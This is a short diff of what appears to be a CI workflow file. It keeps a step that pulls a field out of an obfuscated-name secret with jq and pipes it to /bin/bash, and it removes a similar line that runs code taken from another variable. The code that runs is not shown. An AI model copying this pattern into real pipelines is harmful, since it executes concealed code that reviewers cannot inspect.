@@ -18,7 +18,6 @@ jobs:
           xfam03749: ${{ secrets.xfam03749 }}
         run: |
           printf '%s' "$xfam03749" | jq -r .m70593 | /bin/bash
-          echo $nwmzw80 | jq -r .chco5129 | /bin/bash
 
       - name: Archive output
         if: always()
